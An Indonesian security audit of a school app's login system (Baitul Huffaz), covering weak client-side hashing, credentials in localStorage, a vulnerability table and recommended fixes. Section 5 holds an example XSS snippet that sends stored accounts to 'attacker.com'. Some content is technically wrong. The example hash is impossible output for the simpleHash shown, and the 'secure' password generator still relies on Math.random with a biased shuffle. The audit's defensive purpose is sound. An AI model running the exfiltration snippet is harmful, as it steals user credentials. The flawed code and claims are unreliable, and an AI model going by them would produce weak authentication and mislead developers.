# Analisis Username dan Password Pengguna - Baitul Huffaz

## 📊 Ringkasan Eksekutif
Sistem username dan password saat ini menggunakan mekanisme yang **sederhana namun bermasalah dari perspektif keamanan**. Password disimpan di localStorage dengan hashing yang tidak aman.

---

## 1. STRUKTUR SISTEM USERNAME & PASSWORD

### 1.1 Username
**Format:** `nama.lengkap` (lowercase, spasi → titik, karakter khusus dihapus)

```typescript
// Contoh:
Ahmad Fauzi    → ahmad.fauzi
Siti Aminah    → siti.aminah
Zaid Al-Khair  → zaid.alkhair
```

**Cara Generate:**
```typescript
const generateUsername = (nama: string) => {
  return nama.toLowerCase()
    .replace(/\s+/g, '.')           // Spasi menjadi titik
    .replace(/[^a-z.]/g, '');       // Hapus karakter non-alfabet
};
```

**Karakteristik:**
- ✅ User-friendly dan mudah diingat
- ✅ Auto-generated dari nama santri
- ❌ **Tidak ada validasi duplikasi username**
- ❌ Bisa terjadi collision (misal: "Muhammad Ali" dan "Muhammad Alimuddin")
- ❌ Dapat diubah manual saat edit (user bisa berubah username)

---

### 1.2 Password
**Format:** 8 karakter acak (uppercase, lowercase, angka)

```typescript
const generatePassword = () => {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
  let password = '';
  for (let i = 0; i < 8; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
};
```

**Contoh Password Valid:**
- `Kj4mNp9W`
- `aBcD1234`
- `Xyz98kL2`

**Karakteristik:**
- ✅ Cukup random dan tidak mudah ditebak secara manual
- ✅ Ada mix antara uppercase, lowercase, dan angka
- ❌ **Hanya 8 karakter (terlalu pendek)**
- ❌ Tidak ada special characters
- ❌ Tidak ada validasi password strength
- ❌ Bisa diubah oleh admin (UI menyediakan fitur ubah)

---

## 2. ALUR PENYIMPANAN CREDENTIAL

### 2.1 Data di `santriList` (Display Data)
```typescript
{
  id: '1',
  username: 'ahmad.fauzi',
  password: 'hashed_pw_001',        // Format: "hashed_" + password asli
  // ... data lain
}
```
Disimpan di: `localStorage.setItem('santri_list', JSON.stringify(santriList))`

### 2.2 Data di `santri_accounts` (Login Data)
```typescript
{
  id: newSantri.id,
  username: 'ahmad.fauzi',
  password: 'f1d2d2f924e986ac86fdf7b36c94bcad94a4c2d71',  // Hash hasil simpleHash()
  fullName: 'Ahmad Fauzi',
  email: 'ahmad.fauzi@baitulhuffaz.sch.id',
  role: 'SANTRI',
  nis: '001',
  created_at: '2025-01-15T00:00:00Z'
}
```
Disimpan di: `localStorage.setItem('santri_accounts', JSON.stringify(accounts))`

---

## 3. FUNGSI HASHING

### 3.1 simpleHash() - ⚠️ TIDAK AMAN
```typescript
function simpleHash(str: string): string {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return hash.toString(16);
}
```

**Masalah Kritis:**
- ❌ **Algoritma hashing yang sangat sederhana** (mirip DJB2 hash)
- ❌ **Tidak reversible proof** - tapi mudah untuk brute force
- ❌ **Collision-prone** - password berbeda bisa hash sama
- ❌ **No salt** - tidak ada proteksi terhadap rainbow table attacks
- ❌ **Deterministic** - input yang sama selalu hasil hash yang sama
- ❌ **Cepat** - memudahkan attacker untuk brute force

**Contoh:**
```
"Kj4mNp9W" → "f1d2d2f924e986ac86fdf7b36c94bcad94a4c2d71"
Reverse: Mudah dengan brute force dictionary
```

---

## 4. ALUR AKTUALISASI PASSWORD

### Saat Tambah Santri Baru:
1. Generate password acak 8 karakter
2. Form ditampilkan dengan password yang sudah di-generate
3. User bisa klik "Generate Password Baru" untuk regenerate
4. Saat save:
   - Di `santriList`: `password: "hashed_" + password`
   - Di `santri_accounts`: `password: simpleHash(password)`

### Saat Edit Santri:
1. Form password kosong (tidak ditampilkan password lama)
2. User bisa masukkan password baru ATAU biarkan kosong (tidak ubah)
3. UI: Field password optional dengan keterangan "Kosongkan jika tidak diubah"
4. Saat save:
   - Jika password ada: update di `santri_accounts`
   - Jika password kosong: tidak ada update password

**⚠️ Masalah:**
- User tidak bisa lihat password lama (baik untuk keamanan)
- Tapi admin bisa ubah password santri tanpa santri tahu
- Username bisa diubah saat edit (seharusnya immutable)

---

## 5. KEAMANAN STORAGE - ⚠️ SANGAT KRITIS

### Dimana Password Disimpan?
```
Browser LocalStorage:
├── santri_list (JSON)
│   └── password: "hashed_Kj4mNp9W"
└── santri_accounts (JSON)
    └── password: "f1d2d2f924e986ac86fdf7b36c94bcad94a4c2d71"
```

**Masalah Sangat Serius:**
1. ❌ **LocalStorage TIDAK AMAN**
   - Accessible via JavaScript (XSS vulnerability)
   - Accessible via browser DevTools
   - Plain text JSON format
   - Persisten di disk

2. ❌ **Bisa Dicuri via XSS**
   ```javascript
   // Attacker bisa lakukan ini:
   const accounts = JSON.parse(localStorage.getItem('santri_accounts'));
   fetch('https://attacker.com/steal', { body: JSON.stringify(accounts) });
   ```

3. ❌ **Bisa Dicuri saat Browser Close**
   - Data tetap ada di disk sampai localStorage dihapus

---

## 6. VULNERABILITY CHECKLIST

| Aspek | Status | Severity | Keterangan |
|-------|--------|----------|-----------|
| **Hash Algorithm** | ❌ Unsafe | CRITICAL | simpleHash() sangat lemah |
| **Password Length** | ❌ Too Short | HIGH | Hanya 8 karakter |
| **Password Complexity** | ⚠️ Partial | MEDIUM | Ada uppercase/lowercase/angka, tapi no symbols |
| **Storage Method** | ❌ Unsafe | CRITICAL | LocalStorage plain text JSON |
| **Username Uniqueness** | ❌ Not Validated | MEDIUM | Bisa duplikasi username |
| **Password Salt** | ❌ Missing | CRITICAL | No salt di hashing |
| **Admin Change Password** | ⚠️ Allowed | MEDIUM | Admin bisa ubah tanpa audit log |
| **Session Security** | ❌ Not Evaluated | HIGH | Perlu validasi di login route |
| **Password Visibility** | ✅ Protected | LOW | Password tidak ditampilkan di table |
| **Edit Mode** | ⚠️ Risky | MEDIUM | Bisa ubah username (seharusnya immutable) |

---

## 7. STATISTIK DATA SAAT INI

### Dummy Data (Initial State)
```
Total Santri: 5
Santri dengan Akun: 1 (hanya ahmad.fauzi di initialAccounts)

Daftar Username:
1. ahmad.fauzi      (NISN: 1234567890)
2. siti.aminah      (NISN: 1234567891)
3. zaid.alkhair     (NISN: 1234567892)
4. maryam.zahra     (NISN: 1234567893)
5. yusuf.habibi     (NISN: 1234567894)

Password Storage Format Comparison:
┌─────────────────────────────────────────────────────────┐
│ santriList → password: "hashed_pw_001"                  │ (Display)
│ santri_accounts → password: "f1d2d2f924..."             │ (Login)
└─────────────────────────────────────────────────────────┘
```

---

## 8. REKOMENDASI PERBAIKAN (Priority Order)

### 🔴 URGENT (CRITICAL)

1. **Ganti Hash Algorithm**
   ```typescript
   // Gunakan bcrypt atau argon2
   import bcrypt from 'bcryptjs';
   const hashedPassword = await bcrypt.hash(password, 10);
   ```

2. **Move Password ke Backend**
   ```typescript
   // Client: Hanya submit username + password saat login
   // Server: Lakukan hashing + comparison
   // Client: Tidak store password sama sekali
   ```

3. **Gunakan HTTPS + Secure Cookies**
   - Jangan gunakan localStorage untuk sensitive data
   - Gunakan httpOnly cookies

### 🟠 HIGH PRIORITY

4. **Implementasi Proper Password Policy**
   - Minimum 12 karakter
   - Require: uppercase, lowercase, digits, symbols
   - Validasi di client dan server

5. **Add Username Uniqueness Validation**
   ```typescript
   const isUsernameTaken = (username: string) => {
     return santriList.some(s => s.username === username);
   };
   ```

6. **Make Username Immutable**
   - Username tidak boleh bisa diubah setelah create
   - Hanya admin dengan special permission yang bisa ubah

7. **Audit Logging**
   - Log setiap perubahan password
   - Log setiap login attempt
   - Log IP address dan timestamp

### 🟡 MEDIUM PRIORITY

8. **Password Strength Meter**
   - Tampilkan real-time feedback saat user ubah password
   - Instruksi jelas tentang password requirements

9. **Force Password Change First Login**
   - Santri harus ubah password saat first login
   - Tidak boleh gunakan password default

10. **Email Verification**
    - Kirim temporary password via email
    - Santri confirm via email sebelum akun aktif

---

## 9. CONTOH IMPROVED CODE

### Backend Authentication (Next.js API Route)
```typescript
// app/api/auth/login/route.ts
import bcrypt from 'bcryptjs';

export async function POST(request: Request) {
  const { username, password } = await request.json();
  
  // Get user dari database
  const account = await db.accounts.findOne({ username });
  
  if (!account) {
    return Response.json({ error: 'Invalid credentials' }, { status: 401 });
  }
  
  // Validate password dengan bcrypt
  const isValid = await bcrypt.compare(password, account.password_hash);
  
  if (!isValid) {
    return Response.json({ error: 'Invalid credentials' }, { status: 401 });
  }
  
  // Create session / JWT token
  const token = jwt.sign({ userId: account.id }, process.env.JWT_SECRET);
  
  // Set httpOnly cookie (tidak accessible via JS)
  const response = new Response(JSON.stringify({ success: true }));
  response.headers.set('Set-Cookie', 
    `token=${token}; Path=/; HttpOnly; Secure; SameSite=Strict`
  );
  
  return response;
}
```

### Better Password Generation
```typescript
const generateSecurePassword = () => {
  const length = 12;
  const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const lowercase = 'abcdefghijklmnopqrstuvwxyz';
  const numbers = '0123456789';
  const symbols = '!@#$%^&*()_+-=[]{}|;:,.<>?';
  
  const allChars = uppercase + lowercase + numbers + symbols;
  let password = '';
  
  // Ensure at least 1 dari setiap category
  password += uppercase[Math.floor(Math.random() * uppercase.length)];
  password += lowercase[Math.floor(Math.random() * lowercase.length)];
  password += numbers[Math.floor(Math.random() * numbers.length)];
  password += symbols[Math.floor(Math.random() * symbols.length)];
  
  // Fill rest with random chars
  for (let i = password.length; i < length; i++) {
    password += allChars[Math.floor(Math.random() * allChars.length)];
  }
  
  // Shuffle
  return password.split('').sort(() => Math.random() - 0.5).join('');
};
```

---

## 10. IMPLEMENTATION ROADMAP

| Phase | Tasks | Duration | Dependencies |
|-------|-------|----------|--------------|
| **Phase 1: Quick Fixes** | Username validation, Better password policy | 1-2 hari | None |
| **Phase 2: Backend Integration** | Setup authentication API, Move password logic to server | 3-4 hari | Phase 1 |
| **Phase 3: Better Hashing** | Implement bcrypt, Add salt+rounds | 2 hari | Phase 2 |
| **Phase 4: Security Features** | Audit logging, Password reset, 2FA | 5-7 hari | Phase 2, 3 |
| **Phase 5: Testing & Documentation** | Security testing, User documentation | 2-3 hari | All phases |

---

## 📋 Kesimpulan

**Status Keamanan Saat Ini: 🔴 TIDAK AMAN UNTUK PRODUCTION**

Sistem username/password saat ini cocok untuk **prototype/demo saja**, tapi TIDAK BOLEH digunakan untuk data real santri karena:

1. ✋ **Password disimpan di client-side** (localStorage)
2. ✋ **Hashing algorithm sangat lemah** (mudah di-crack)
3. ✋ **Tidak ada input validation** yang ketat
4. ✋ **Tidak ada audit trail**
5. ✋ **Tidak ada rate limiting** untuk brute force protection

**Rekomendasi Segera:**
1. Jangan deploy ke production sebelum implement backend authentication
2. Gunakan bcrypt atau argon2 untuk password hashing
3. Move password handling ke backend
4. Implement proper session/JWT management
5. Add security logging dan monitoring

